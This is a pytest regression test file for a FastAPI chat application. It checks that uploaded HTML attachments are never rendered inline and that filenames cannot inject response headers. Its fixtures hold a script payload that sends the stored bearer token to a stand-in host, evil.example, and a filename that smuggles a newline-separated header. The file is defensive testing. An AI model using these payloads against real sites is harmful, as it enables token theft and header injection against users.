"""Attachments must never come back as something the browser will run.

This origin holds the bearer token in localStorage. A .html file is a
reasonable thing to attach and ask about, and it is stored with the type it
arrived as -- so serving it back as `text/html` inline renders it on this
origin and hands a script in it the token. That was live, and this is the test
that says so if it ever comes back.
"""

from __future__ import annotations

import base64

import pytest
from fastapi.testclient import TestClient

from app.config import Settings
from app.main import create_app

PNG = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
)
SCRIPT = b"<script>fetch('//evil.example/?t='+localStorage.getItem('unified-llm-token'))</script>"


@pytest.fixture
def client(tmp_path):
    settings = Settings(
        db_path=tmp_path / "test.db",
        client_dir=tmp_path / "nonexistent",
        auth_token="testtoken",
        documents_dir=tmp_path / "documents",
    )
    with TestClient(create_app(settings)) as test_client:
        test_client.headers["Authorization"] = "Bearer testtoken"
        yield test_client


def _upload(client, name, mime, data):
    """Attach a file to a message and return what the API serves back for it."""
    body = {
        "message": "have a look",
        "attachments": [
            {"name": name, "mime": mime, "data": base64.b64encode(data).decode()}
        ],
    }
    # The turn itself fails without a model running; the attachment is stored
    # before any of that, which is all this needs.
    with client.stream("POST", "/api/chat", json=body) as stream:
        stream.read()
    session_id = client.get("/api/sessions").json()["sessions"][0]["id"]
    for message in client.get(f"/api/sessions/{session_id}").json()["messages"]:
        for attachment in message["attachments"]:
            return client.get(f"/api/attachments/{attachment['id']}")
    raise AssertionError("the attachment was not stored")


def test_html_attachment_is_never_served_as_html(client):
    response = _upload(client, "report.html", "text/html", SCRIPT)
    assert response.status_code == 200
    assert "text/html" not in response.headers["content-type"]
    assert response.headers["content-disposition"].startswith("attachment")
    # The bytes are still faithfully returned -- this is about how the browser
    # is told to treat them, not about mangling the file.
    assert response.content == SCRIPT


def test_images_are_still_served_inline_and_as_themselves(client):
    response = _upload(client, "pixel.png", "image/png", PNG)
    assert response.headers["content-type"].startswith("image/png")
    assert response.headers["content-disposition"].startswith("inline")
    # Not byte-identical: uploads are re-encoded on the way in so the local
    # runner can always read them. Still a PNG, which is what matters here.
    assert response.content.startswith(b"\x89PNG\r\n")


def test_a_filename_cannot_inject_a_header(client):
    # The name reaches a response header and came from the user.
    response = _upload(client, 'a"b\nX-Injected: yes\n.txt', "text/plain", b"hello")
    assert "x-injected" not in {k.lower() for k in response.headers}
    assert "\n" not in response.headers["content-disposition"]
